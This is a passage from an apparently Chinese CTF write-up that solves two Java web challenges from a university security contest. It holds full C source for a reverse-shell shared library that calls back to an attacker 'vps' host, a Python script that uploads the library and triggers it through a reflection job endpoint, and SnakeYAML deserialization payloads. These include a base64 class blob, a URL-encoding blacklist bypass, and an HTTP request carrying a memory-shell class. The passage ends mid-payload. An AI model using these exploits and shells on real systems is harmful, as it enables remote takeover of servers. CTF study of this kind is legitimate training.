<span class="hljs-keyword">else</span> &#123;<br>                ++bracketLevel;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (start &lt; paramStr.length()) &#123;<br>            params.add(paramStr.substring(start));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (String[])params.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledJob</span> &#123;<br>        <span class="hljs-keyword">private</span> String jobName;<br>        <span class="hljs-keyword">private</span> String invokeTarget;<br>        <span class="hljs-keyword">private</span> String cronExpression;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getJobName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.jobName;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setJobName</span><span class="hljs-params">(String jobName)</span> &#123;<br>            <span class="hljs-built_in">this</span>.jobName = jobName;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInvokeTarget</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.invokeTarget;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setInvokeTarget</span><span class="hljs-params">(String invokeTarget)</span> &#123;<br>            <span class="hljs-built_in">this</span>.invokeTarget = invokeTarget;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCronExpression</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.cronExpression;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCronExpression</span><span class="hljs-params">(String cronExpression)</span> &#123;<br>            <span class="hljs-built_in">this</span>.cronExpression = cronExpression;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>给了文件上传的路由，也给了将传入的文件转换为job的add路由，其次是run这个job的路由，也是恶意点位。</p><p>这个<code>/job/run/</code>调用的还是它自己写的<code>invokeMethod()</code>，它使用 Java Reflection来动态地调用一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、解析输入字符串：它接收一个格式为 className#methodName(param1,param2,...) 的字符串 invokeTarget。<br><span class="hljs-number">2</span>、加载类：它根据字符串中的 className 部分，使用 Class.forName(className) 来加载对应的类。<br><span class="hljs-number">3</span>、解析方法和参数：它从字符串中提取出方法名和参数。它会尝试解析参数的类型，支持字符串（用单引号包裹）、整数、布尔值和 <span class="hljs-literal">null</span>。<br><span class="hljs-number">4</span>、获取方法对象：它使用反射在加载的类中查找与方法名和参数类型匹配的方法。它首先尝试查找公共方法 (getMethod)，如果找不到，会继续尝试查找私有方法 (getDeclaredMethod) 并设置其为可访问 (setAccessible(<span class="hljs-literal">true</span>))。<br><span class="hljs-number">5</span>、创建实例并调用：<br>如果方法是静态的 (<span class="hljs-keyword">static</span>)，它会直接调用。<br>如果方法是实例方法，它会先通过 clazz.newInstance() 创建该类的一个新实例（调用无参构造函数），然后调用该实例的方法。<br><span class="hljs-number">6</span>、返回结果：它返回被调用方法的执行结果。<br></code></pre></td></tr></table></figure><p>总之，我们可以知道这个方法允许程序根据一个字符串来执行任意类的任意（包括私有的）方法。</p><p>这里思路就有了，就是上传一个东西，然后把它添加到一个job里，这个东西里面含有某种恶意代码，然后让这个&#x2F;job&#x2F;run来触发它。</p><p>其实就是一个小trick，很自然能想到**<code>上传一个恶意so文件(可反弹shell)</code>，然后调用<code>java.lang.System#load//loadLibrary</code>来触发加载它**。</p><p>这也是加载本地库（Native Libraries），特别是在使用Java的JNI（Java Native Interface）机制的常用方法，绕RASP用的。</p><p>但是我们这里最好需要指定恶意so文件上传的路径，如果用loadLibrary虽说可以不用加什么后缀，但加载的文件必须在设置的<code>java.library.path</code>里，但是我们好像不知道这玩意，题目只告诉我们上传路径在&#x2F;tmp&#x2F;uploads。所以只能用load。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>之后就是写一个反弹shell的c代码，gcc编译成so：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-comment">// 使用 __attribute__((constructor)) 确保在库加载时自动执行此函数</span><br>__attribute__((constructor))<br><span class="hljs-type">void</span> <span class="hljs-title function_">revshell</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* ip = <span class="hljs-string">&quot;vps&quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> port = <span class="hljs-number">1234</span>;<br>    <span class="hljs-comment">// --------------------------------</span><br><br>    <span class="hljs-type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sock &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span><br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_port = htons(port);<br>    server_addr.sin_addr.s_addr = inet_addr(ip);<br><br>    <span class="hljs-keyword">if</span> (connect(sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) != <span class="hljs-number">0</span>) &#123;<br>        close(sock);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 重定向标准输入、输出和错误到socket</span><br>    dup2(sock, <span class="hljs-number">0</span>); <span class="hljs-comment">// stdin</span><br>    dup2(sock, <span class="hljs-number">1</span>); <span class="hljs-comment">// stdout</span><br>    dup2(sock, <span class="hljs-number">2</span>); <span class="hljs-comment">// stderr</span><br><br>    <span class="hljs-comment">// 执行一个shell</span><br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    close(sock);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC revshell.c -o revshell.so<br></code></pre></td></tr></table></figure><p>先curl上传一下文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -F <span class="hljs-string">&quot;file=@revshell.so&quot;</span> http://pss.idss-cn.com:24480/api/upload<br></code></pre></td></tr></table></figure><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822010953192.png" alt="image-20250822010953192"></p><p>然后写个脚本直接打。</p><p>最后注意一下绕过条件，但是加个<code>//</code>再把FLAG类名加后面就能随便绕了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_and_run_job</span>(<span class="hljs-params">base_url</span>):<br>    job_name = <span class="hljs-string">&quot;revshell&quot;</span><br>    <span class="hljs-comment"># so_path = &quot;/tmp/uploads/revshell.so&quot;</span><br>    invoke_target = <span class="hljs-string">&quot;java.lang.System#load(&#x27;/tmp/uploads/revshell.so&#x27;) // com.jabaez.FLAG&quot;</span><br><br>    <span class="hljs-comment"># --- 1. 添加任务 ---</span><br>    add_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/api/job/add&quot;</span><br>    add_payload = &#123;<br>        <span class="hljs-string">&quot;jobName&quot;</span>: job_name,<br>        <span class="hljs-string">&quot;invokeTarget&quot;</span>: invoke_target<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        add_response = requests.post(add_url, json=add_payload, timeout=<span class="hljs-number">5</span>)<br>        add_response.raise_for_status()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 任务添加成功: <span class="hljs-subst">&#123;add_response.json()&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 添加任务失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># --- 2. 运行任务 ---</span><br>    run_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/api/job/run/<span class="hljs-subst">&#123;job_name&#125;</span>&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[*] 正在运行任务: <span class="hljs-subst">&#123;job_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 运行任务会触发反弹shell，请求可能会超时，这是正常的</span><br>        run_response = requests.post(run_url, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 任务执行请求已发送。服务器响应: <span class="hljs-subst">&#123;run_response.text&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 请求超时。这可能是因为反向shell已成功建立。请检查您的监听器。&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 运行任务时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    target_url = <span class="hljs-string">&quot;http://pss.idss-cn.com:24480&quot;</span><br>    add_and_run_job(target_url)<br></code></pre></td></tr></table></figure><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011044892.png" alt="image-20250822011044892"></p><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011051221.png" alt="image-20250822011051221"></p><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>这道其实出题人很抽象的放在了第一题的附件里，但是题是下午放出来的，所以题刚放出来就被打烂了。。。</p><p>有点难评（</p><p>但我想说的是，这道题虽然也很简单，就一个随便写yaml表达式的接口然后yaml.load反序列化，但是我们最后解题的思路是值得说道说道的，来自队里oy学长的<code>ClassPathXmlApplicationContext</code>打法。</p><p>同时我也参考了一下：</p><p><a href="https://forum.butian.net/share/4486">奇安信攻防社区-SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘</a></p><p>本来当时想打这个：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<br>  <span class="hljs-type">!!com.sun.javafx.iio.ImageFrame</span> [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&amp;A</span> [<span class="hljs-type">!!binary</span> <span class="hljs-string">&quot;yv66vgAAADQAXwoAEgA0BwA1CgACADQHADYKADcAOAoAOQA6CgACADsJADwAPQcAPgoACQA/CgBAAEEKAEIAQwgARAoAQgBFBwBGBwBHCgAQAEgHAEkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vaGVpaHU1NzcvYmVhbi9FdmlsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZlbmNvZGUBAAJbQgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwBKAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwBGAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwAEwAUAQAqb3JnL2FwYWNoZS90b21jYXQvdXRpbC9jb2RlYy9iaW5hcnkvQmFzZTY0AQAWY29tL2hlaWh1NTc3L2JlYW4vRXZpbAcASwwATABNBwBODABPAFAMAB4AUQcAUgwAUwBUAQAQamF2YS9sYW5nL1N0cmluZwwAEwBVBwBWDABXAFgHAFkMAFoAWwEABGNhbGMMAFwAXQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAEwBeAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAK2NvbS9zdW4vb3JnL2FwYWNoZS9iY2VsL2ludGVybmFsL1JlcG9zaXRvcnkBAAtsb29rdXBDbGFzcwEASShMamF2YS9sYW5nL0NsYXNzOylMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL0phdmFDbGFzczsBADRjb20vc3VuL29yZy9hcGFjaGUvYmNlbC9pbnRlcm5hbC9jbGFzc2ZpbGUvSmF2YUNsYXNzAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGKFtCKVtCAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEABAASAAAAAAAFAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADgAXAAAADAABAAAABQAYABkAAAAJABoAGwABABUAAABeAAQAAgAAACK7AAJZtwADEgS4AAW2AAa2AAdMsgAIuwAJWSu3AAq2AAuxAAAAAgAWAAAADgADAAAAEAATABEAIQASABcAAAAWAAIAAAAiABwAHQAAABMADwAeAB8AAQABACAAIQACABUAAAA/AAAAAwAAAAGxAAAAAgAWAAAABgABAAAAHwAXAAAAIAADAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACQAJQACACYAAAAEAAEAJwABACAAKAACABUAAABJAAAABAAAAAGxAAAAAgAWAAAABgABAAAAJAAXAAAAKgAEAAAAAQAYABkAAAAAAAEAIgAjAAEAAAABACkAKgACAAAAAQArACwAAwAmAAAABAABACcACAAtABQAAQAVAAAAZgADAAEAAAAXuAAMEg22AA5XpwANS7sAEFkqtwARv7EAAQAAAAkADAAPAAMAFgAAABYABQAAABYACQAZAAwAFwANABgAFgAaABcAAAAMAAEADQAJAC4ALwAAADAAAAAHAAJMBwAxCQABADIAAAACADM=&quot;</span>], <span class="hljs-literal">null</span>],<br>  <span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span> [<br>    <span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span> [<span class="hljs-string">*A</span>,<span class="hljs-string">&quot;heihu577&quot;</span>,<span class="hljs-type">!!java.util.Properties</span> &#123;&#125;,<span class="hljs-type">!!int</span> <span class="hljs-number">0</span>,<span class="hljs-type">!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span> &#123;&#125;]<br>  ]<br>]<br></code></pre></td></tr></table></figure><p>但是靶机那边java好像没这个类，我本地也没有，但oy学长有emmmm…..这个跟java自己装的依赖有关系吧。</p><p>它ban的也不彻底，而且这么ban基本随便绕。。。</p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011932168.png" class="" title="image-20250822011932168"><p>payload是打的那个写文件操作，双重URL编码就绕了。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!!org.springframework.context.support.ClassPathXmlApplicationContext [ <span class="hljs-string">&quot;file://$&#123;catalina.home&#125;/**/*.tmp&quot;</span> ]<br></code></pre></td></tr></table></figure><p>这里取了个巧，通过<code>$&#123;catalina.home&#125;</code>直接拿到它的位置，这里应该是从<code>ClassPathXmlApplicationContext</code>任意文件写&#x2F;&#x2F;无外网RCE的这个trick出的一道题我那里看来的。</p><p>可以先参考：</p><p><a href="https://blog.csdn.net/asasd101/article/details/147158437">Java利用无外网（下）：ClassPathXmlApplicationContext的不出网利用-CSDN博客</a></p><p><a href="https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html">ClassPathXmlApplicationContext的不出网利用 | 离别歌</a></p><p><a href="https://forum.butian.net/share/4467">奇安信攻防社区-从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用</a></p><p>绕黑名单直接把<code>ClassPath</code>给再编码一次就完了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!!org.springframework.context.support.%<span class="hljs-number">43</span>%6c%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%68XmlApplicationContext [ <span class="hljs-string">&quot;file://$&#123;catalina.home&#125;/**/*.tmp&quot;</span> ]<br></code></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>http报文我用yakit抓的，所以它又自动帮我编码了一次，内部打一个RCE在<code>X-Authorization</code>的内存🐎就可以了：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/yaml?yamlContent=%21%21org%2Espringframework%2Econtext%2Esupport%2E%2543%256c%2561%2573%2573%2550%2561%2574%2568XmlApplicationContext%20%5B%20%22file%3A%2F%2F%24%7Bcatalina%2Ehome%7D%2F%2A%2A%2F%2A%2Etmp%22%20%5D</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pss.idss-cn.com:24458<br><span class="hljs-attribute">X-Authorization</span><span class="hljs-punctuation">: </span>cat /flag<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryINBwinb4uWPnBREL<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>7984<br><br><span class="language-bash">------WebKitFormBoundaryINBwinb4uWPnBREL</span><br><span class="language-bash">Content-Disposition: form-data; name=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="language-bash"></span><br><span class="language-bash">&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="language-bash">       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="language-bash">       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="language-bash">    &lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;decoder&quot;</span> class=<span class="hljs-string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span><br><span class="language-bash">        &lt;property name=<span class="hljs-string">&quot;staticMethod&quot;</span> value=<span class="hljs-string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;property name=<span class="hljs-string">&quot;arguments&quot;</span>&gt;</span><br><span class="language-bash">            &lt;list&gt;</span><br><span class="language-bash">                &lt;value&gt;yv66vgAAADIBOwEAWW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL1J1bnRpbWVKc29uTWFwcGluZ0V4Y2VwdGlvbmJkZDg2N2FkM2U2ZDQ3YWI4YjNkMjE3M2U5ZTQ0YWEyBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAcMAAUABgoABAAJAQADcnVuDAALAAYKAAIADAEAEGdldFJlcUhlYWRlck5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAD1gtQXV0aG9yaXphdGlvbggAEAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABQBABBqYXZhL2xhbmcvVGhyZWFkBwAWAQAKZ2V0VGhyZWFkcwgAGAEAD2phdmEvbGFuZy9DbGFzcwcAGgEAEltMamF2YS9sYW5nL0NsYXNzOwcAHAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAHgAfCgAbACABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACIBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAJAAlCgAjACYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACgAKQoAIwAqAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcALAEAB2dldE5hbWUMAC4ADwoAFwAvAQAEaHR0cAgAMQEAEGphdmEvbGFuZy9TdHJpbmcHADMBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwANQA2CgA0ADcBAAhBY2NlcHRvcggAOQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAOwA8CgAEAD0BAAZ0YXJnZXQIAD8BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABBAEIKABsAQwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwBFCgBGACYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwASABJCgBGAEoBAAhlbmRwb2ludAgATAEABnRoaXMkMAgATgEAB2hhbmRsZXIIAFABAA1nZXRTdXBlcmNsYXNzDABSADwKABsAUwEABmdsb2JhbAgAVQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVwBYCgAbAFkBACJvcmcuYXBhY2hlLmNveW90ZS5SZXF1ZXN0R3JvdXBJbmZvCAB